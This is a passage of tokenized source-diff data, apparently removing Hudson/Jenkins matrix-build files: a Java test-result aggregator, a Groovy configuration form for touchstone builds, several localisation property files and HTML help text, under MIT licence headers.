"*", "/", "@", "Override", "protected", "String", "getChildName", "(", "AbstractTestResultAction", "tr", ")", "{", "return", "tr", ".", "owner", ".", "getProject", "(", ").", "getName", "(", ");", "}", "@", "Override", "public", "AbstractBuild", "<", "?,", "?>", "resolveChild", "(", "Child", "child", ")", "{", "MatrixBuild", "b", "=", "(", "MatrixBuild", ")", "owner", ";", "return", "b", ".", "getProject", "(", ").", "getItem", "(", "Combination", ".", "fromString", "(", "child", ".", "name", ")", ").", "getBuildByNumber", "(", "child", ".", "build", ")", ";", "}", "@", "Override", "public", "String", "getTestResultPath", "(", "TestResult", "it", ")", "{", "/", "/", "Prepend", "Configuration", "path", "return", "it", ".", "getOwner", "(", ").", "getParent", "(", ").", "getShortUrl", "(", ")", "+", "super", ".", "getTestResultPath", "(", "it", ")", ";", "}", "}", "@", "@", "-", "1", ",", "60", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Yahoo", "!", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "tasks", ".", "test", ";", "import", "hudson", ".", "Launcher", ";", "import", "hudson", ".", "matrix", ".", "MatrixAggregator", ";", "import", "hudson", ".", "matrix", ".", "MatrixBuild", ";", "import", "hudson", ".", "matrix", ".", "MatrixRun", ";", "import", "hudson", ".", "model", ".", "BuildListener", ";", "import", "java", ".", "io", ".", "IOException", ";", "/", "**", "*", "Aggregates", "{", "@", "link", "AbstractTestResultAction", "}", "s", "of", "{", "@", "link", "MatrixRun", "}", "s", "*", "into", "{", "@", "link", "MatrixBuild", "}", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "TestResultAggregator", "extends", "MatrixAggregator", "{", "private", "MatrixTestResult", "result", ";", "public", "TestResultAggregator", "(", "MatrixBuild", "build", ",", "Launcher", "launcher", ",", "BuildListener", "listener", ")", "{", "super", "(", "build", ",", "launcher", ",", "listener", ")", ";", "}", "@", "Override", "public", "boolean", "startBuild", "(", ")", "throws", "InterruptedException", ",", "IOException", "{", "result", "=", "new", "MatrixTestResult", "(", ");", "build", ".", "addAction", "(", "result", ")", ";", "return", "true", ";", "}", "@", "Override", "public", "boolean", "endRun", "(", "MatrixRun", "run", ")", "throws", "InterruptedException", ",", "IOException", "{", "AbstractTestResultAction", "atr", "=", "run", ".", "getAction", "(", "AbstractTestResultAction", ".", "class", ")", ";", "if", "(", "atr", "!", "=", "null", ")", "result", ".", "add", "(", "atr", ")", ";", "return", "true", ";", "}", "}", "@", "@", "-", "2", ",", "8", "+", "2", ",", "6", "@", "@", "import", "hudson", ".", "matrix", ".", "MatrixBuild", ";", "import", "hudson", ".", "matrix", ".", "MatrixRun", ";", "*", "<", "li", ">", "Check", "out", "will", "only", "happen", "once", "in", "{", "@", "link", "MatrixBuild", "}", ",", "and", "its", "state", "will", "be", "then", "sent", "*", "to", "{", "@", "link", "MatrixRun", "}", "s", "by", "other", "means", "such", "as", "rsync", ".", "*", "<", "li", ">", "{@", "link", "MatrixBuild", "}", "does", "no", "check", "out", "of", "its", "own", ",", "and", "check", "out", "is", "only", "done", "on", "{", "@", "link", "MatrixRun", "}", "s", "package", "hudson", ".", "matrix", ".", "DefaultMatrixExecutionStrategyImpl", ";", "import", "hudson", ".", "matrix", ".", "MatrixConfigurationSorterDescriptor", "import", "hudson", ".", "model", ".", "Result", ";", "def", "f", "=", "namespace", "(", "lib", ".", "FormTagLib", ")", "f", ".", "optionalBlock", "(", "field", ":", "\"", "runSequentially", "\"", ",", "title", ":", "_", "(", "\"", "Run", "each", "configuration", "sequentially", "\"", "),", "inline", ":", "true", ")", "{", "if", "(", "MatrixConfigurationSorterDescriptor", ".", "all", "(", ").", "size", "(", ")>", "1", ")", "{", "f", ".", "dropdownDescriptorSelector", "(", "title", ":", "_", "(", "\"", "Execution", "order", "of", "builds", "\"", "),", "field", ":", "\"", "sorter", "\"", ")", "}", "}", "f", ".", "optionalBlock", "(", "field", ":", "\"", "hasTouchStoneCombinationFilter", "\"", ",", "title", ":", "_", "(", "\"", "Execute", "touchstone", "builds", "first", "\"", "),", "inline", ":", "true", ")", "{", "/", "/", "TODO", ":", "help", "=", "\"/", "help", "/", "matrix", "/", "touchstone", ".", "html", "\"", ">", "/", "/", "TODO", ":", "move", "l10n", "from", "MatrixProject", "/", "configEntries", ".", "jelly", "f", ".", "entry", "(", "title", ":", "_", "(", "\"", "Filter", "\"", "),", "field", ":", "\"", "touchStoneCombinationFilter", "\"", ")", "{", "f", ".", "textbox", "(", ")", "}", "f", ".", "entry", "(", "title", ":", "_", "(", "\"", "Required", "result", "\"", "),", "field", ":", "\"", "touchStoneResultCondition", "\"", ",", "description", ":", "_", "(", "\"", "required", ".", "result", ".", "description", "\"", "))", "{", "select", "(", "name", ":", "\"", "touchStoneResultCondition", "\"", ")", "{", "f", ".", "option", "(", "value", ":", "\"", "SUCCESS", "\"", ",", "selected", ":", "my", ".", "touchStoneResultCondition", "=", "=", "Result", ".", "SUCCESS", ",", "_", "(", "\"", "Stable", "\"", "))", "f", ".", "option", "(", "value", ":", "\"", "UNSTABLE", "\"", ",", "selected", ":", "my", ".", "touchStoneResultCondition", "=", "=", "Result", ".", "UNSTABLE", ",", "_", "(", "\"", "Unstable", "\"", "))", "}", "}", "}", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Seiji", "Sogabe", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "required", ".", "result", ".", "description", "=", "\\", "Execute", "the", "rest", "of", "the", "combinations", "only", "if", "the", "touchstone", "builds", "has", "(", "at", "least", ")", "the", "selected", "result", ".", "@", "@", "-", "1", ",", "29", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "Kohsuke", "Kawaguchi", ".", "Knud", "Poulsen", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Execute", "\\", "touchstone", "\\", "builds", "\\", "first", "=", "K", "\\", "u00f8r", "touchstone", "byg", "f", "\\", "u00f8rst", "Filter", "=", "Filter", "Required", "\\", "result", "=", "N", "\\", "u00f8dvendigt", "resultat", "Run", "\\", "each", "\\", "configuration", "\\", "sequentially", "=", "K", "\\", "u00f8r", "hver", "konfiguration", "sekventielt", "Stable", "=", "Stabil", "Unstable", "=", "Ustabil", "required", ".", "result", ".", "description", "=", "Afvikl", "kun", "resten", "af", "kombinationerne", "hvis", "touchstone", "byggene", "har", "mindst", "det", "\\", "u00f8nskede", "resultat", ".", "@", "@", "-", "1", ",", "30", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Simon", "Wiest", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Required", "\\", "result", "=", "Mindest", "-", "Resultat", "Stable", "=", "Stabil", "Unstable", "=", "Instabil", "required", ".", "result", ".", "description", "=", "F", "\\", "u00fchre", "verbleibende", "Kombinationen", "nur", "aus", ",", "wenn", "\\", "die", "Touchstone", "-", "Builds", "mindestens", "das", "gew", "\\", "u00e4hlte", "Resultat", "lieferten", ".", "Execute", "\\", "touchstone", "\\", "builds", "\\", "first", "=", "Touchstone", "-", "Builds", "zuerst", "ausf", "\\", "u00fchren", "Run", "\\", "each", "\\", "configuration", "\\", "sequentially", "=", "Konfigurationen", "sequentiell", "ausf", "\\", "u00fchren", "Filter", "=", "Filter", "@", "@", "-", "1", ",", "31", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "2012", "sogabe", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Run", "\\", "each", "\\", "configuration", "\\", "sequentially", "=", "\\", "u5404", "\\", "u8a2d", "\\", "u5b9a", "\\", "u3092", "\\", "u9806", "\\", "u6b21", "\\", "u8d77", "\\", "u52d5", "Execution", "\\", "order", "\\", "of", "\\", "builds", "=", "\\", "u30d3", "\\", "u30eb", "\\", "u30c9", "\\", "u306e", "\\", "u5b9f", "\\", "u884c", "\\", "u9806", "\\", "u5e8f", "Execute", "\\", "touchstone", "\\", "builds", "\\", "first", "=", "\\", "u6700", "\\", "u521d", "\\", "u306b", "\\", "u7279", "\\", "u5b9a", "\\", "u306e", "\\", "u30d3", "\\", "u30eb", "\\", "u30c9", "\\", "u3092", "\\", "u5b9f", "\\", "u884c", "Filter", "=", "\\", "u30d5", "\\", "u30a3", "\\", "u30eb", "\\", "u30bf", "\\", "u30fc", "Required", "\\", "result", "=", "\\", "u30d3", "\\", "u30eb", "\\", "u30c9", "\\", "u7d50", "\\", "u679c", "required", ".", "result", ".", "description", "=", "\\", "\\", "u6700", "\\", "u521d", "\\", "u306b", "\\", "u5b9f", "\\", "u884c", "\\", "u3057", "\\", "u305f", "\\", "u30d3", "\\", "u30eb", "\\", "u30c9", "\\", "u304c", "(", "\\", "u5c11", "\\", "u306a", "\\", "u304f", "\\", "u3068", "\\", "u3082", ")", "\\", "u9078", "\\", "u629e", "\\", "u3057", "\\", "u305f", "\\", "u7d50", "\\", "u679c", "\\", "u3067", "\\", "u3042", "\\", "u308b", "\\", "u5834", "\\", "u5408", "\\", "u306e", "\\", "u307f", "\\", "u3001", "\\", "u6b8b", "\\", "u308a", "\\", "u306e", "\\", "u7d44", "\\", "u307f", "\\", "u5408", "\\", "u308f", "\\", "u305b", "\\", "u3092", "\\", "u5b9f", "\\", "u884c", "\\", "u3057", "\\", "u307e", "\\", "u3059", "\\", "u3002", "Stable", "=", "\\", "u5b89", "\\", "u5b9a", "Unstable", "=", "\\", "u4e0d", "\\", "u5b89", "\\", "u5b9a", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Reginaldo", "L", ".", "Russinholi", ",", "Cleiber", "Silva", ",", "Fernando", "Boaglio", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Execute", "\\", "touchstone", "\\", "builds", "\\", "first", "=", "Ordenar", "por", "builds", "Unstable", "=", "Inst", "\\", "u00e1vel", "Run", "\\", "each", "\\", "configuration", "\\", "sequentially", "=", "Rodar", "cada", "configura", "\\", "u00e7", "\\", "u00e3o", "em", "sequ", "\\", "u00eancia", "Stable", "=", "Est", "\\", "u00e1vel", "Required", "\\", "result", "=", "Resultado", "Filter", "=", "Filtro", "required", ".", "result", ".", "description", "=", "Executar", "as", "demais", "combina", "\\", "u00e7", "\\", "u00f5es", "somente", "se", "os", "crit", "\\", "u00e9rios", "de", "builds", "tiver", "(", "pelo", "menos", ")", "o", "resultado", "selecionado", ".", "@", "@", "-", "1", ",", "31", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2013", ",", "Chunghwa", "Telecom", "Co", ".", ",", "Ltd", ".", ",", "Pei", "-", "Tang", "Huang", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Run", "\\", "each", "\\", "configuration", "\\", "sequentially", "=", "\\", "u5faa", "\\", "u5e8f", "\\", "u57f7", "\\", "u884c", "\\", "u5404", "\\", "u9805", "\\", "u8a2d", "\\", "u5b9a", "Execution", "\\", "order", "\\", "of", "\\", "builds", "=", "\\", "u5efa", "\\", "u7f6e", "\\", "u57f7", "\\", "u884c", "\\", "u9806", "\\", "u5e8f", "Execute", "\\", "touchstone", "\\", "builds", "\\", "first", "=", "\\", "u512a", "\\", "u5148", "\\", "u5efa", "\\", "u7f6e", "\\", "u300c", "\\", "u8a66", "\\", "u91d1", "\\", "u77f3", "\\", "u300d", "Filter", "=", "\\", "u7be9", "\\", "u9078", "\\", "u689d", "\\", "u4ef6", "Required", "\\", "result", "=", "\\", "u5fc5", "\\", "u8981", "\\", "u7d50", "\\", "u679c", "required", ".", "result", ".", "description", "=", "\\", "\\", "u53ea", "\\", "u6709", "\\", "u5728", "\\", "u300c", "\\", "u8a66", "\\", "u91d1", "\\", "u77f3", "\\", "u300d", "\\", "u5efa", "\\", "u7f6e", "\\", "u7d50", "\\", "u679c", "\\", "u7b26", "\\", "u5408", "\\", "u9810", "\\", "u671f", "\\", "u6642", "\\", "u624d", "\\", "u57f7", "\\", "u884c", "\\", "u5176", "\\", "u4ed6", "\\", "u7d44", "\\", "u5408", "\\", "u3002", "Stable", "=", "\\", "u7a69", "\\", "u5b9a", "Unstable", "=", "\\", "u4e0d", "\\", "u7a69", "\\", "u5b9a", "<", "div", ">", "Use", "a", "touchstone", "build", "if", "you", "want", "to", "run", "a", "sanity", "check", "before", "building", "all", "the", "combinations", ".", "You", "can", "select", "a", "number", "of", "combinations", "using", "a", "combination", "filter", ".", "These", "will", "be", "built", "first", ".", "If", "the", "result", "satisfies", "the", "result", "condition", ",", "the", "rest", "of", "the", "combinations", "will", "be", "built", ".", "<", "/", "div", ">", "<", "div", ">", "Ein", "\"", "Touchstone", "\"", "-", "Build", "ist", "ein", "besonderer", "Build", ",", "der", "Sie", "besonders", "fr", "\u00fc", "hzeitig", "auf", "Probleme", "in", "Ihrem", "Code", "hinweist", ",", "z", ".", "B", ".", "durch", "Ausf", "\u00fc", "hrung", "essentieller", "Plausibilit", "\u00e4", "tstests", ".", "<", "p", ">", "Wenn", "angew", "\u00e4", "hlt", ",", "f", "\u00fc", "hrt", "Jenkins", "zun", "\u00e4", "chst", "die", "Touchstone", "-", "Builds", "aus", ",", "bevor", "dann", "alle", "weiteren", "Kombinationen", "gebaut", "werden", ".", "Sie", "k", "\u00f6", "nnen", "\u00fc", "ber", "einen", "Kombinationsfilter", "auch", "mehrere", "Builds", "als", "Touchstone", "-", "Build", "kennzeichnen", ".", "Nur", "wenn", "das", "Ergebnis", "der", "Touchstone", "-", "Builds", "die", "Ergebnisbedingung", "erf", "\u00fc", "llt", ",", "werden", "alle", "weiteren", "Kombinationen", "gebaut", ".", "<", "/", "div", ">", "<", "div", ">", "\u3059", "\u3079\u3066", "\u306e\u7d44", "\u307f\u5408", "\u308f\u305b", "\u3092\u30d3", "\u30eb\u30c9", "\u3059\u308b", "\u524d\u306b", "\u3001\u6b63", "\u5e38\u304b", "\u3069\u3046", "\u304b\u30c1", "\u30a7\u30c3", "\u30af\u3057", "\u305f\u3044", "\u5834\u5408", "\u306b\u4f7f", "\u7528\u3057", "\u307e\u3059", "\u3002", "\u30d5", "\u30a3\u30eb", "\u30bf\u30fc", "\u3092\u4f7f", "\u7528\u3057", "\u3066\u3001", "\u6700\u521d", "\u306b\u5b9f", "\u884c\u3059", "\u308b\u30d3", "\u30eb\u30c9", "\u306e\u7d44", "\u307f\u5408", "\u308f\u305b", "\u3092\u9078", "\u629e\u3067", "\u304d\u307e", "\u3059\u3002", "\u7d50", "\u679c\u304c", "\"\u30d3", "\u30eb\u30c9", "\u7d50\u679c", "\"\u306e", "\u6761\u4ef6", "\u3092\u6e80", "\u305f\u3057", "\u305f\u5834", "\u5408\u3001", "\u6b8b\u308a", "\u306e\u7d44", "\u307f\u5408", "\u308f\u305b", "\u304c\u30d3", "\u30eb\u30c9", "\u3055\u308c", "\u307e\u3059", "\u3002", "<", "/", "div", ">", "<", "div", ">", "\u5982", "\u679c\u60a8", "\u60f3\u5728", "\u5efa\u7f6e", "\u6240\u6709", "\u7d44\u5408", "\u524d\u5148", "\u505a\u4e9b", "\u4f8b\u884c", "\u6aa2\u67e5", "\uff0c\u5c31", "\u53ef\u4ee5", "\u4f7f\u7528", "\u300c\u8a66", "\u91d1\u77f3", "\u300d\u5efa", "\u7f6e\u3002", "\u53ef", "\u4ee5\u900f", "\u904e\u7d44", "\u5408\u7be9", "\u9078\u689d", "\u4ef6\u9078", "\u51fa\u4e00", "\u4e9b\u7d44", "\u5408\uff0c", "\u4e26\u512a", "\u5148\u5efa", "\u7f6e\u5b83", "\u5011\u3002", "\u53ea", "\u6709\u5728", "\u7d50\u679c", "\u7b26\u5408", "\u9810\u671f", "\u689d\u4ef6", "\u6642\uff0c", "\u624d\u6703", "\u5efa\u7f6e", "\u5176\u4ed6", "\u7d44\u5408", "\u3002", "<", "/", "div", ">", "<", "div", ">", "With", "this", "option", "checked", ",", "Jenkins", "builds", "each", "configuration", "in", "a", "sequence", ".", "This", "can", "be", "useful", "if", "your", "configuration", "needs", "to", "access", "the", "shared", "resource", "like", "database", ",", "as", "well", "as", "to", "avoid", "crowding", "out", "other", "jobs", ".", "<", "/", "div", ">", "@", "@", "-", "1", ",", "6", "+", "0", ",", "0", "@", "@", "<", "div", ">", "Wenn", "angew", "\u00e4", "hlt", ",", "baut", "Jenkins", "alle", "Konfigurationen", "sequentiell", "nacheinander", ".", "Dies", "kann", "zum", "einen", "n", "\u00fc", "tzlich", "sein", ",", "wenn", "Konfigurationen", "eine", "gemeinsame", "Ressource", "ben", "\u00f6", "tigen", ",", "z", ".", "B", ".", "eine", "Datenbank", ".", "Zum", "anderen", "vermeidet", "es", 